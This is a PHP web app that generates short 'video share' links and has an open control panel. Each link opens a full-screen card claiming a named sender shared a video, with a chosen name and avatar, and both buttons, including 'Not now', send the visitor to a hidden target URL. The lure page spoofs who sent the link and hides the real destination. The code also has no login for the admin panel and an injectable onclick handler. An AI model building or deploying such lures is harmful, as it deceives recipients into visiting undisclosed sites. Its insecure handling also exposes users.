<?php
date_default_timezone_set('Africa/Algiers');

ini_set('display_errors', 1);
error_reporting(E_ALL);

try {
    $db = new PDO('sqlite:tracker_pro.db');
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $db->exec("CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT UNIQUE, 
        target_url TEXT, 
        sender_name TEXT,
        sender_avatar TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
} catch (Exception $e) {
    die("Database error: " . $e->getMessage());
}

$target_redirect = "";
$sender_name = "User";
$sender_avatar = "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=60";

// معالجة زيارة الرابط القصير
if (isset($_GET['r'])) {
    $code = $_GET['r'];
    $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($link) {
        $target_redirect = $link['target_url'];
        $sender_name = $link['sender_name'];
        $sender_avatar = $link['sender_avatar'];
    } else {
        die("Link not found.");
    }
}

// إنشاء رابط جديد من لوحة التحكم
$generated_link = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
    $target_url = trim($_POST['target_url']);
    $sender_name = trim($_POST['sender_name']) ?: "User";
    $sender_avatar = trim($_POST['sender_avatar']) ?: "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=60";

    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
        $target_url = "https://" . $target_url;
    }

    $code = substr(md5(uniqid(rand(), true)), 0, 7);
    $stmt = $db->prepare("INSERT INTO links (code, target_url, sender_name, sender_avatar) VALUES (?, ?, ?, ?)");
    $stmt->execute([$code, $target_url, $sender_name, $sender_avatar]);

    $domain = $_SERVER['HTTP_HOST'];
    $generated_link = "https://" . $domain . "/?r=" . $code;
}

$links_list = $db->query("SELECT * FROM links ORDER BY id DESC LIMIT 20")->fetchAll(PDO::FETCH_ASSOC);

// إذا كان الزائر يفتح رابط تعقب، يتم عرض واجهة الفيديو التفاعلية
if (isset($_GET['r']) && !empty($target_redirect)):
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shared Video</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
        body, html { width: 100%; height: 100%; overflow: hidden; background: #000; }
        
        /* خلفية الفيديو المتحركة */
        .video-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 1;
            overflow: hidden;
        }
        .video-background video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: brightness(0.6);
        }

        /* حاوية البطاقة التفاعلية فوق الفيديو */
        .overlay-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 2;
            display: flex;
            justify-content: center;
            align-items: center;
            background: rgba(0, 0, 0, 0.4);
            padding: 20px;
        }

        .modal-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            width: 100%;
            max-width: 350px;
            border-radius: 20px;
            padding: 30px 20px;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
            animation: fadeIn 0.4s ease-out;
        }

        @keyframes fadeIn {
            from { transform: scale(0.9); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        .avatar-container {
            width: 76px;
            height: 76px;
            border-radius: 50%;
            overflow: hidden;
            margin: 0 auto 16px auto;
            border: 3px solid #fe2c55;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
        }
        .avatar-container img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        h2 { font-size: 18px; font-weight: 700; color: #111; margin-bottom: 6px; }
        p { font-size: 13px; color: #555; margin-bottom: 24px; line-height: 1.5; }

        .btn-action {
            display: block;
            width: 100%;
            background: #fe2c55;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 12px;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            text-decoration: none;
            margin-bottom: 10px;
            box-shadow: 0 4px 14px rgba(254,44,85,0.4);
            transition: background 0.2s;
        }
        .btn-action:hover { background: #e02045; }
        .btn-secondary {
            background: transparent;
            color: #777;
            border: none;
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
            padding: 6px;
        }
    </style>
</head>
<body>

    <!-- خلفية فيديو متحركة (يمكنك استبدال الرابط بأي فيديو قصير بصيغة mp4) -->
    <div class="video-background">
        <video autoplay muted loop playsinline>
            <source src="https://assets.mixkit.co/videos/preview/mixkit-vertical-view-of-a-traffic-jam-at-night-42616-large.mp4" type="video/mp4">
        </video>
    </div>

    <div class="overlay-container">
        <div class="modal-card">
            <div class="avatar-container">
                <img src="<?php echo htmlspecialchars($sender_avatar); ?>" alt="Avatar">
            </div>
            <h2>Watch this video</h2>
            <p><strong><?php echo htmlspecialchars($sender_name); ?></strong> shared a video with you. Watch now to view content!</p>
            <a href="<?php echo htmlspecialchars($target_redirect); ?>" class="btn-action">Watch Now</a>
            <button class="btn-secondary" onclick="window.location.href='<?php echo htmlspecialchars($target_redirect); ?>'">Not now</button>
        </div>
    </div>

</body>
</html>
<?php 
    exit(); 
endif; 
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Panel</title>
    <style>
        :root {
            --bg-main: #0b0f17;
            --bg-card: #131b2e;
            --border-color: #1e293b;
            --text-main: #e2e8f0;
            --text-muted: #64748b;
            --accent: #6366f1;
            --accent-hover: #4f46e5;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
        body { background-color: var(--bg-main); color: var(--text-main); padding: 30px 15px; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; }
        .wrapper { max-width: 900px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
        
        .section-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 25px; box-shadow: 0 10px 15px rgba(0,0,0,0.3); }
        h2 { font-size: 14px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.1em; color: var(--text-muted); margin-bottom: 16px; border-bottom: 1px solid var(--border-color); padding-bottom: 8px; }

        .form-grid { display: grid; gap: 12px; }
        input[type="text"] { width: 100%; background: #020617; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 14px; color: var(--text-main); font-size: 14px; outline: none; }
        input[type="text"]:focus { border-color: var(--accent); }
        
        .btn { background: var(--accent); color: white; border: none; padding: 0 24px; border-radius: 8px; font-weight: 600; cursor: pointer; height: 46px; display: inline-flex; align-items: center; justify-content: center; font-size: 14px; text-decoration: none; transition: background 0.2s; }
        .btn:hover { background: var(--accent-hover); }
        .btn-secondary { background: #334155; }

        .result-panel { background: #020617; border: 1px solid var(--border-color); padding: 16px; border-radius: 8px; margin-top: 15px; }
        .result-panel label { display: block; font-size: 10px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 6px; }
        .flex-row { display: flex; gap: 8px; }

        .table-wrap { overflow-x: auto; border: 1px solid var(--border-color); border-radius: 8px; margin-top: 15px; }
        table { width: 100%; border-collapse: collapse; text-align: left; font-size: 12px; }
        th { background: #020617; color: var(--text-muted); padding: 12px 15px; border-bottom: 1px solid var(--border-color); text-transform: uppercase; }
        td { padding: 12px 15px; border-bottom: 1px solid var(--border-color); color: #cbd5e1; }

        .code-badge { background: rgba(99, 102, 241, 0.1); color: #818cf8; padding: 4px 8px; border-radius: 4px; font-family: monospace; border: 1px solid rgba(99, 102, 241, 0.2); }
        footer { text-align: center; margin-top: 40px; font-size: 11px; color: var(--text-muted); border-top: 1px solid var(--border-color); padding-top: 20px; }
        footer span { color: var(--accent); font-weight: 600; }
    </style>
    <script>
        function copyText(text, btnElement) {
            navigator.clipboard.writeText(text).then(() => {
                const original = btnElement.innerText;
                btnElement.innerText = "Copied";
                btnElement.style.background = "#10b981";
                setTimeout(() => {
                    btnElement.innerText = original;
                    btnElement.style.background = "";
                }, 2000);
            });
        }
    </script>
</head>
<body>
    <div class="wrapper">
        
        <div class="section-box">
            <h2>Generate Video Link</h2>
            <form method="POST" class="form-grid">
                <input type="text" name="target_url" placeholder="Target Destination URL (e.g. YouTube)..." required>
                <div style="display: flex; gap: 10px;">
                    <input type="text" name="sender_name" placeholder="Sender Name (e.g. azez)">
                    <input type="text" name="sender_avatar" placeholder="Sender Avatar Image URL">
                </div>
                <button type="submit" name="create" class="btn">Generate Link</button>
            </form>

            <?php if (!empty($generated_link)): ?>
                <div class="result-panel">
                    <label>Active Link:</label>
                    <div class="flex-row">
                        <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
                        <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">Copy</button>
                    </div>
                </div>
            <?php endif; ?>
        </div>

        <div class="section-box">
            <h2>Generated Links History</h2>
            <div class="table-wrap">
                <table>
                    <thead>
                        <tr>
                            <th>#ID</th>
                            <th>Code</th>
                            <th>Sender</th>
                            <th>Target URL</th>
                            <th>Created At</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if (empty($links_list)): ?>
                            <tr><td colspan="5" style="text-align: center; color: var(--text-muted); padding: 30px;">No links generated yet.</td></tr>
                        <?php else: ?>
                            <?php foreach ($links_list as $row): ?>
                            <tr>
                                <td><?php echo $row['id']; ?></td>
                                <td><span class="code-badge"><?php echo htmlspecialchars($row['code']); ?></span></td>
                                <td style="font-weight: 600; color: #fff;"><?php echo htmlspecialchars($row['sender_name']); ?></td>
                                <td style="color: #38bdf8; max-width: 300px; overflow: hidden; text-overflow: ellipsis;"><?php echo htmlspecialchars($row['target_url']); ?></td>
                                <td style="color: #10b981;"><?php echo htmlspecialchars($row['created_at']); ?></td>
                            </tr>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        </div>

    </div>

    <footer>
        <p>Core Engine <span>azeez</span> &copy; 2026</p>
    </footer>
</body>
</html>
